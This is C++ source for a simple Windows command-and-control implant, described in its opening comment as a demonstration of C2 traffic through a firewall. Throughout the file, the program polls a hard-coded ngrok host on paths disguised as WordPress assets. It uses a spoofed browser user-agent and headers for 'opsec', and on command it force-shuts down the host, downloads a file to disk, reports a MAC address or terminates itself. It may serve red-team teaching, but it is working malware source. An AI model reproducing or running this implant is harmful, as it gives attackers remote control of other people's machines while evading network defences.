//Created for the purpose of demonstrating basic C2 communications through a firewall.

#include <iostream>
#define _WINSOCKAPI_   /* Prevent inclusion of winsock.h in windows.h */
#include <winsock2.h>
#include <iphlpapi.h>
#include <WinInet.h>
//#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <Windows.h>
#include <tchar.h>

#pragma comment (lib, "Wininet.lib")
#pragma comment(lib, "iphlpapi.lib")

#define c2_domain "http://ce92fef58a77.ngrok.io"
#define Download_Uri "app/uploads/2021/04/040721_infographic_01-1050x696.jpg"
using namespace std;

LPCSTR RetrieveCommand(LPCSTR Payload_Url, LPCSTR Payload_Uri) {
   

    HINTERNET hSession = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", //Define normal firefox user-agent for target environment
        INTERNET_OPEN_TYPE_PRECONFIG,                                                     
        NULL,
        NULL,
        0
    );

    /*void InternetOpenUrlA(
   HINTERNET hInternet,
   LPCSTR    lpszUrl,
   LPCSTR    lpszHeaders,
   DWORD     dwHeadersLength,
   DWORD     dwFlags,
   DWORD_PTR dwContext
 );
 */
    HINTERNET hUrl = InternetOpenUrlA(
        hSession,
        (Payload_Url + std::string(Payload_Uri)).c_str(),       //C2 Server
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n \
        Accept-Encoding: gzip,deflate\n \
        Accept-Language : en-US,en;q=0.9653\n", //Set custom h eader values for opsec and for c2 server to check for authentication
        -1L,
        INTERNET_FLAG_RELOAD,
        0);


        /*BOOLAPI InternetReadFile(
      HINTERNET hFile,
      LPVOID    lpBuffer,
      DWORD     dwNumberOfBytesToRead,
      LPDWORD   lpdwNumberOfBytesRead
    );*/
    DWORD dwBytesRead;
    BOOL bReadFile;
    DWORD dwFileSize;
    char* lpBuffer;

    dwFileSize = BUFSIZ;  //Default 512 Bytes
    lpBuffer = new char[dwFileSize + 1];

    bReadFile = InternetReadFile(
        hUrl,
        lpBuffer,
        dwFileSize + 1,
        &dwBytesRead
    );

    if (!bReadFile) {
        printf("Error: <%lu>\n", GetLastError());
    }
    else {
        lpBuffer[dwBytesRead] = 0;
        //printf("%s\n", lpBuffer);
        return lpBuffer;
    }
    InternetCloseHandle(hSession);
}

void SendResponse(LPCSTR Payload_Url, LPCSTR Payload_Uri, LPCSTR PostData) {

    HINTERNET hSession = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", //Define normal firefox user-agent for target environment
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );

    HINTERNET hUrl = InternetOpenUrlA(
        hSession,
        (Payload_Url + std::string(Payload_Uri)).c_str(),       //C2 Server
        ("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n \
        Accept-Encoding: gzip,deflate\n \
        Accept-Language : en-US,en;q=0.9653\n \
        Response: " + std::string(PostData)).c_str(),
        -1L,
        INTERNET_FLAG_RELOAD,
        0);
   
    InternetCloseHandle(hSession);
}

BOOL SystemShutdown() //https://docs.microsoft.com/en-us/windows/win32/shutdown/how-to-shut-down-the-system
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Get a token for this process. 

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return(FALSE);

    // Get the LUID for the shutdown privilege. 

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
        &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;  // one privilege to set    
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Get the shutdown privilege for this process. 

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
        (PTOKEN_PRIVILEGES)NULL, 0);

    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    // Shut down the system and force all applications to close. 

    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
        SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
        SHTDN_REASON_MINOR_UPGRADE |
        SHTDN_REASON_FLAG_PLANNED))
        return FALSE;

    //shutdown was successful
    return TRUE;
}

void KillAgent() { //https://helloacm.com/can-a-win32-c-process-kill-itself/
    HANDLE hnd;
    DWORD pid = GetCurrentProcessId();
    hnd = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
    TerminateProcess(hnd, 0);
}

void PrintMACaddress(BYTE* addr)
{
    for (int i = 0; i < 6; i++)
    {
       
        printf("%x:", *addr++);
        
        
    }
}
LPCSTR GetMac() {
    //https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersaddresses
    ULONG outBufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = NULL;

    pAddresses = (IP_ADAPTER_ADDRESSES *) malloc(outBufLen);
    DWORD dwStatus = 0;
    if (pAddresses == NULL) {
        printf
        ("Memory allocation failed for IP_ADAPTER_ADDRESSES struct\n");
        exit(1);
    }
    dwStatus = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
    if (dwStatus == ERROR_BUFFER_OVERFLOW) {
        free(pAddresses);
        pAddresses = NULL;
    }
    else if (dwStatus == NO_ERROR) {
        //If succesfully able to pull information down, let's grab what we want
        LPCSTR PA = "00-50-56-BA-DC-AA";
        if (pAddresses->PhysicalAddressLength != 0) {
            printf("\tPhysical address: ");
            for (int i = 0; i < (int)pAddresses->PhysicalAddressLength; i++) {
                if (i == (pAddresses->PhysicalAddressLength - 1))
                    printf("%.2X\n", (int)pAddresses->PhysicalAddress[i]);
                else
                    printf("%.2X-", (int)pAddresses->PhysicalAddress[i]);
            }
        
            /*for (int i = 0; i < (int)pAddresses->PhysicalAddressLength; i++) {
               PA = (int)pAddresses->PhysicalAddress[i];
               printf("%d", PA);
                //else
                  //  (PhysicalAddress + std::string((int)pAddresses->PhysicalAddress[i])).c_str();
            }*/
        }
        return PA;
    }


/*    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    DWORD dwStatus = GetAdaptersInfo(
        AdapterInfo,
        &dwBufLen
    );
    if (dwStatus != ERROR_SUCCESS) {
        printf("Error: <%lu>\n", GetLastError());
    }

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    PrintMACaddress(pAdapterInfo->Address);
    return;*/
}
void DownloadFile(LPCSTR Payload_Url) {


    HINTERNET hSession = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", //Define normal firefox user-agent for target environment
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );
    
    HINTERNET hUrl = InternetOpenUrlA(
        hSession,
        (Payload_Url + std::string("/wp-content/uploads")).c_str(),       //C2 Server
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n \
        Accept-Encoding: gzip,deflate\n \
        Accept-Language : en-US,en;q=0.9653\n", //Set custom h eader values for opsec and for c2 server to check for authentication
        -1L,
        INTERNET_FLAG_RELOAD,
        0);

    DWORD dwBytesRead;
    BOOL bReadFile;
    DWORD dwFileSize;
    char* lpBuffer;

    dwFileSize = BUFSIZ;  //Default 512 Bytes
    lpBuffer = new char[dwFileSize + 1];

    bReadFile = InternetReadFile(
        hUrl,
        lpBuffer,
        dwFileSize + 1,
        &dwBytesRead
    );

    if (!bReadFile) {
        printf("Error: <%lu>\n", GetLastError());
    }
    else {
        lpBuffer[dwBytesRead] = 0;
        HANDLE hFile;
        BOOL bErrorFlag = FALSE;
        DWORD dwBytesWritten = 0;
        DWORD dwBytesToWrite = (DWORD)strlen(lpBuffer);


        //lpBuffer WriteFile to disk
        //https://docs.microsoft.com/en-us/windows/win32/fileio/opening-a-file-for-reading-or-writing
        hFile = CreateFile(
            L"C:/Users/User/Desktop/dropped_file.txt",  //Hardcoded for now
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            printf("Error: <%lu>\n", GetLastError());
            return;
        }


        bErrorFlag = WriteFile(
            hFile,           // open file handle
            lpBuffer,      // start of data to write
            dwBytesToWrite,  // number of bytes to write
            &dwBytesWritten, // number of bytes that were written
            NULL);
        CloseHandle(hFile);
    }
  
    InternetCloseHandle(hSession);

}
int main()
{
    LPCSTR Payload_Uri[] = {"/wp/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.6-78496d1","/wp/wp-includes","/wp-content/wp-includes/dtssdma.js?ver=1.0"};
    int Num_of_Uris = 0;
    for (int i = 0; i < sizeof(Payload_Uri); i++) //Terribly crappy way of calculating the number of elements in the array
    {
        if (Payload_Uri[i] != NULL)
            Num_of_Uris++;
    }
    
    int rotation = 0;

    LPCSTR Payload;
    while (TRUE) {      //Main loop checking for commands
        Payload = RetrieveCommand(c2_domain, Payload_Uri[rotation]);
        printf("Command Received: %s\n", Payload);


        if (strcmp(Payload,"shutdown") == 0) {
            //do stuff
            SendResponse(c2_domain, Payload_Uri[rotation], "[*] Agent succesfully tasked to shutdown host system");
            if (!SystemShutdown()) //If we didn't shutdown, display the error
            {
                printf("Error: <%lu>\n", GetLastError());
            }
            printf("shutdown\n"); //shouldn't print since the system...well you know :P
        }

        else if (strcmp(Payload,"killagent") == 0) {
            //do stuff
            printf("Starting to send response");
            SendResponse(c2_domain, Payload_Uri[rotation],"[*] Agent succesfully tasked to kill itself");
            printf("Sent response");
            KillAgent();
        }

        else if (strcmp(Payload, "getmac") == 0) {
            //do stuff
            SendResponse(c2_domain, Payload_Uri[rotation],GetMac());
        }
        else if (strcmp(Payload, "uploadfile") == 0) {
            //do stuff
            printf("uploadfile");
            SendResponse(c2_domain, Payload_Uri[rotation], "File uploaded at C:/Users/User/Desktop/dropped_file.txt");
            DownloadFile(c2_domain);
        }
        else {
            //default case
            SendResponse(c2_domain, Payload_Uri[rotation], "[-] Unknown Command");
            printf("Command Failure: %s",Payload);
        }
        if (rotation == Num_of_Uris)
            rotation = 0;
        Sleep(5000);
        rotation++;
    }
    

    
}
